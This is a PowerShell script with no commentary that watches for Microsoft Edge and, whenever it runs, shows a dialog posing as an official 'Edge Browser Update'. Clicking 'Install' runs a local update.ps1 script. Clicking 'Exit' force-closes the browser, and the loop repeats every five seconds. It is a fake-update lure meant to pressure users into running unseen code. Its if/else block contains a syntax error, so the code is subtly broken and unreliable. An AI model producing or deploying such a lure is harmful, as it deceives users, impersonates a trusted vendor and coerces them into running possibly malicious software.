Add-Type -AssemblyName System.Windows.Forms

function ShowTermsOfServicePopup {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Edge Browser Update"
    $form.Width = 400
    $form.Height = 250
    $form.StartPosition = "CenterScreen"

    $richtextBox = New-Object System.Windows.Forms.RichTextBox
    $richtextBox.Width = 350
    $richtextBox.Height = 120
    $richtextBox.Location = New-Object System.Drawing.Point(10,10)
    $richtextBox.ReadOnly = $true
    $richtextBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
    $richtextBox.BackColor = $form.BackColor

    $richtextBox.SelectionFont = New-Object System.Drawing.Font($richtextBox.Font.FontFamily, 12, [System.Drawing.FontStyle]::Bold)
    $richtextBox.AppendText("Important Update Available. Click 'Update' to install.`n`n")
    $richtextBox.SelectionFont = $richtextBox.Font
    $richtextBox.AppendText("Browser: Edge Browser`nVerified Published: Edge`n`nNecessary measures: Click 'Install' to update.")

    $agreeButton = New-Object System.Windows.Forms.Button
    $agreeButton.Text = "Install"
    $agreeButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $agreeButton.Location = New-Object System.Drawing.Point(50,150)

    $disagreeButton = New-Object System.Windows.Forms.Button
    $disagreeButton.Text = "Exit"
    $disagreeButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
    $disagreeButton.Location = New-Object System.Drawing.Point(230,150)

    $form.Controls.Add($richtextBox)
    $form.Controls.Add($agreeButton)
    $form.Controls.Add($disagreeButton)

    $result = $form.ShowDialog()

   if ($result -eq [System.Windows.Forms.DialogResult]::OK) {

    Invoke-Expression "$env:USERPROFILE\Desktop\update.ps1"


    return $true

    } else:

        Get-Process -Name "msedge" | Stop-Process -Force
        return $false
    }

while ($true) {
    Start-Sleep -Seconds 5
    $edgeProcess = Get-Process -Name "msedge" -ErrorAction SilentlyContinue
    if ($edgeProcess) {
        $popupShown = ShowTermsOfServicePopup
    }
}
